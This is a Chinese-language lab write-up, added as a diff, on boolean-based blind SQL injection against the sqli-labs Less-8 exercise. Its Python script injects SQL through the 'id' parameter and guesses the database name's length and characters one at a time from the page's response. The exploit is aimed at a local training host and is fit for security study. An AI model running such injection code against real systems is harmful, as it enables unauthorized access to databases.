@@ -1,0 +1,64 @@
+# sqli-labs_less_8_布尔盲注获取数据库名
+
+- 该代码主要实现用布尔盲注来得到数据库名
+- 适用场景：sqli-labs/less-8
+
+### 环境布置
+
+- 实现该功能需要用`requests`模块、`string`模块，和注入点的url，并创建一个请求
+
+![image-20240311190239825](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240311190239825.png)
+
+
+
+### 确定数据库的长度
+
+- 因为数据库的长度可能是1位也有可能是五十位，所以我们需要建立一个循环，让他测试一下到底有多少位，可以根据请求所返回的正文来判断是否正确（该场景下，如果条件内容是正确的会返回`You are in ...`,错误则没有。利用该情况可以实现布尔盲注）
+
+  ![image-20240311191649053](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240311191649053.png)
+
+
+### 确定数据库名
+
+- 经过上一步骤，已经得到该数据库名长度为八位，那么分析一下，数据库名可以由大写字母`A~Z`、小写字母`a~z`、数字`0~9`还有一些特殊符号，但是必须由字母开头。这些都是可打印字符，python中有一个`string`模块可以得到所有的可打印字符，那么只需要把这些字符跟数据库名的字符依次比较，即可得到数据库的名字
+
+  ![image-20240311200505616](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240311200505616.png)
+
+
+
+### 源码
+
+```python
+import requests
+import string
+url="http://192.168.200.148/sqli-labs-master/Less-8/"
+
+req=requests.session()
+# 确定数据库名的长度
+for i in range(1,51):
+    params={
+        'id': f" 1' and length(database())={i} -- "
+    }
+    res=req.get(url=url,params=params)
+    if "You are in......" in res.text:
+        dbname_len=i
+        break
+print(f"[+] The length of dbname is {i}")
+
+# 确定数据库名
+c_set=string.printable.strip()
+db_name=""
+for i in range(1,dbname_len+1):
+   for  j in c_set :
+        params={
+        'id': f" 1' and substr(database(),{i},1)='{j}' -- "
+        }
+        res=req.get(url=url,params=params)
+        if "You are in......" in res.text:
+            db_name+=j
+            break
+print(f"[+] name of The Database is {db_name}")
+
+
+```
+
